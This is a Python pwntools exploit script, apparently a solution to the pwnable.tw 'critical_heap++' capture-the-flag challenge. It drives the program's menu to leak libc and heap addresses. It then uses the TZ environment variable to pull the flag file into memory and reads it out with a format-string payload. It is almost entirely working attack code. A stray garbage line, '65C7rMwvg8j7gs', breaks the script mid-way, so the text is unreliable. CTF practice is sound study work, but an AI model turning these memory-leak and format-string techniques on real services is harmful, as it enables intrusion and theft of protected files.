from pwn import *

# __printf_chk disables %N$

def create_normal(name: bytes, content: bytes):
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendafter(b'Name of heap:', name)
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendafter(b'Content of heap :', content)

def create_clock(name: bytes):
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendafter(b'Name of heap:', name)
    io.sendlineafter(b'Your choice : ', b'2')

def create_system(name: bytes):
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendafter(b'Name of heap:', name)
    io.sendlineafter(b'Your choice : ', b'3')

def show_heap(idx: int):
    io.sendlineafter(b'Your choice : ', b'2')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.recvuntil(b'Name : ')
    name = io.recvline(keepends = False)
    io.recvuntil(b'Content : ')
    content = io.recvline(keepends = False)
    return name, content

def rename_heap(idx: int, name: bytes):
    io.sendlineafter(b'Your choice : ', b'3')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendafter(b'Name of heap:', name)

def show_normal_content(idx: int):
    io.sendlineafter(b'Your choice : ', b'4')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendlineafter(b'Your choice : ', b'3') 

def change_normal_content(idx: int, content: bytes):
    io.sendafter(b'Your choice : ', b'4\n')
    io.sendafter(b'Index of heap :', str(idx).encode()+b'\n')
    io.sendafter(b'Your choice : ', b'2\n')
    io.sendafter(b'Content :', content)
    io.sendafter(b'Your choice : ', b'3\n') #return

def show_clock(idx: int):
    io.sendafter(b'Your choice : ', b'4\n')
    io.sendafter(b'Index of heap :', str(idx).encode()+b'\n')
    io.sendafter(b'Your choice : ', b'1\n')
    io.sendafter(b'Your choice : ', b'3\n') #return

def update_clock(idx: int):
    io.sendafter(b'Your choice : ', b'4\n')
    io.sendafter(b'Index of heap :', str(idx).encode()+b'\n')
    io.sendafter(b'Your choice : ', b'2\n')
    io.sendafter(b'Your choice : ', b'3\n') #return

def play_system_set(idx: int, name: bytes, value: bytes):
    io.sendlineafter(b'Your choice : ', b'4')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendafter(b'Give me a name for the system heap :', name)
    io.sendafter(b'Give me a value for this name :', value)
    io.sendlineafter(b'Your choice : ', b'5')

def play_clock_update(idx: int):
    io.sendlineafter(b'Your choice : ', b'4')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendlineafter(b'Your choice : ', b'2')
    io.sendlineafter(b'Your choice : ', b'3')

def play_normal_show(idx: int):
    io.sendlineafter(b'Your choice : ', b'4')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendlineafter(b'Your choice : ', b'1')
    io.recvuntil(b'Content :')
    data = io.recvuntil(b'*****************************', drop = True)
    io.sendlineafter(b'Your choice : ', b'3')
    return data

def del_system_env(idx: int, name: bytes):
    io.sendafter(b'Your choice : ', b'4\n')
    io.sendafter(b'Index of heap :', str(idx).encode()+b'\n')
    io.sendafter(b'Your choice : ', b'1\n')
    io.sendafter(b'What\'s name do you want to unset :', name)
    io.sendafter(b'Your choice : ', b'5\n') #return

def get_realpath(idx: int):
    io.sendafter(b'Your choice : ', b'4\n')
    io.sendafter(b'Index of heap :', str(idx).encode()+b'\n')
    io.sendafter(b'Your choice : ', b'3\n')

def get_value_of_name(idx: int, name: bytes):
    io.sendafter(b'Your choice : ', b'4\n')
    io.sendafter(b'Index of heap :', str(idx).encode()+b'\n')
    io.sendafter(b'Your choice : ', b'4\n')
    io.sendafter(b'What\'s name do you want to see :', name)
    io.sendafter(b'Your choice : ', b'5\n') #return

def delete_heap(idx: int):
    io.sendafter(b'Your choice : ', b'5\n')
    io.sendafter(b'Index of heap :', str(idx).encode()+b'\n')

io = remote('localhost', 56746)
#io = remote('chall.pwnable.tw', 10500)

create_normal(b'A', b'A') # 0
create_system(b'B') # 1
change_normal_content(0, b'A' * 0x28)
name, content = show_heap(0)
libc_base = u64(name.ljust(8, b'\0')) - 0x3c6741;
heap_base = u64(content[0x30:].ljust(8, b'\0')) - 0x30;

log.info('Libc base = ' + hex(libc_base))
log.info('Heap base = ' + hex(heap_base))

play_system_set(1, b'TZ', b'/home/critical_heap++/flag')
create_clock(b'C') # 2
play_clock_update(2)
flag_addr = heap_base + 0x440

create_normal(b'A', b'%c' * 19 + b'%s') # 3
65C7rMwvg8j7gs

io.sendafter(b'Your choice : ', b'4       ' + p64(flag_addr)[:-1])
io.sendlineafter(b'Index of heap :', b'3')
io.sendlineafter(b'Your choice : ', b'1')
io.recvuntil(b'Content :')


io.interactive()
